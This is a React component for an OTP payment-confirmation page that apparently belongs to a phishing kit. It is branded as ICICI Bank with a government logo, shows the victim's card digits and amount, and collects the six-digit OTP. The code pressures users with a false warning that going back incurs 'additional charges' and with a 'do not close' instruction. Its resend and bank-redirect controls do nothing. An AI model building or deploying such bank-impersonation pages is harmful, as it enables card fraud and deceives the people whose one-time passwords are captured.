
import React, { useState, useEffect } from 'react';
import { ArrowLeft } from 'lucide-react';

interface OTPVerificationPageProps {
  onBack: () => void;
  onConfirm: (otp: string) => void;
  isLoading: boolean;
  invalidOtpMessage: string;
  cardNumber: string;
  amount: string;
  bankLogo?: string;
}

const OTPVerificationPage: React.FC<OTPVerificationPageProps> = ({
  onBack,
  onConfirm,
  isLoading,
  invalidOtpMessage,
  cardNumber,
  amount,
  bankLogo = 'ICICI BANK'
}) => {
  const [otp, setOtp] = useState('');
  const [timer, setTimer] = useState(300); // 5 minutes in seconds
  const [showResendOtp, setShowResendOtp] = useState(false);

  useEffect(() => {
    // Show resend OTP after 10 seconds
    const resendTimer = setTimeout(() => {
      setShowResendOtp(true);
    }, 10000);

    return () => clearTimeout(resendTimer);
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setTimer(prev => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}.${secs.toString().padStart(2, '0')}`;
  };

  const getLastFourDigits = () => {
    return cardNumber.replace(/\s/g, '').slice(-4);
  };

  const handleBackClick = () => {
    const confirmed = window.confirm('Do you want to cancel this transaction? Pressing back will result in additional charges.');
    if (confirmed) {
      window.location.href = '/';
    }
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
    setOtp(value);
  };

  const handleConfirmPayment = () => {
    if (otp.length === 6) {
      onConfirm(otp);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b">
        <button 
          onClick={handleBackClick}
          className="p-2 hover:bg-gray-100 rounded-full"
        >
          <ArrowLeft className="w-5 h-5 text-gray-600" />
        </button>
        
        <div className="flex-1 flex justify-center">
          <img 
            src="/lovable-uploads/40768023-71d9-41cc-8cd5-c292a76218c2.png" 
            alt="Government Logo"
            className="h-12 w-auto"
          />
        </div>
        
        <div className="w-9"></div> {/* Spacer for centering */}
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 max-w-md mx-auto w-full">
        <div className="w-full space-y-6">
          {/* Title */}
          <div className="text-center">
            <h1 className="text-xl font-medium text-gray-800 mb-2">Enter OTP</h1>
            <p className="text-sm text-gray-600 flex items-center justify-center">
              Total Payable Amount ₹{amount}
              <span className="ml-2 w-4 h-4 bg-blue-500 rounded-full flex items-center justify-center">
                <span className="text-white text-xs">i</span>
              </span>
            </p>
          </div>

          {/* Divider */}
          <div className="w-full h-px bg-gray-200 shadow-sm"></div>

          {/* Bank Logo */}
          <div className="text-center py-4">
            <div className="inline-flex items-center justify-center w-16 h-16 bg-red-600 rounded-full mb-3">
              <span className="text-white font-bold text-lg">i</span>
            </div>
            <div className="text-lg font-semibold text-gray-800">{bankLogo}</div>
          </div>

          {/* OTP Instructions */}
          <div className="text-center">
            <p className="text-sm text-gray-700 mb-4">
              Enter OTP sent to card ending in ****{getLastFourDigits()}
            </p>

            {/* Invalid OTP Message */}
            {invalidOtpMessage && (
              <div className="mb-4 p-3 border border-red-300 bg-red-50 rounded text-red-600 text-sm">
                {invalidOtpMessage}
              </div>
            )}

            {/* OTP Input */}
            <div className="relative mb-4">
              <input
                type="text"
                value={otp}
                onChange={handleOtpChange}
                placeholder="Enter OTP"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg text-center text-lg tracking-widest focus:outline-none focus:border-blue-500"
                maxLength={6}
                disabled={isLoading}
              />
              {showResendOtp && (
                <button className="absolute right-3 top-1/2 transform -translate-y-1/2 text-blue-600 text-sm hover:underline">
                  Resend OTP
                </button>
              )}
            </div>

            {/* Confirm Payment Button */}
            <button
              onClick={handleConfirmPayment}
              disabled={otp.length !== 6 || isLoading}
              className={`w-full py-3 px-4 rounded-lg font-medium transition-all ${
                otp.length === 6 && !isLoading
                  ? 'bg-blue-500 text-white hover:bg-blue-600'
                  : 'bg-gray-300 text-gray-500 cursor-not-allowed'
              }`}
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                  <span className="opacity-70">Processing...</span>
                </div>
              ) : (
                'CONFIRM PAYMENT'
              )}
            </button>

            {/* Timer */}
            <p className="text-sm text-gray-600 mt-4">
              OTP will expire in {formatTime(timer)} minutes
            </p>

            {/* Bank Website Link */}
            <div className="mt-6 text-center">
              <p className="text-xs text-gray-500 mb-1">
                You can always complete the transaction on your
              </p>
              <p className="text-xs text-gray-500 mb-1">
                bank's website. <span className="text-blue-600 underline cursor-pointer">Redirect to bank's page</span>
              </p>
            </div>

            {/* Warning */}
            <div className="mt-6 text-center">
              <p className="text-sm font-semibold text-gray-800">
                DO NOT CLOSE OR REFRESH THE PAGE
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default OTPVerificationPage;
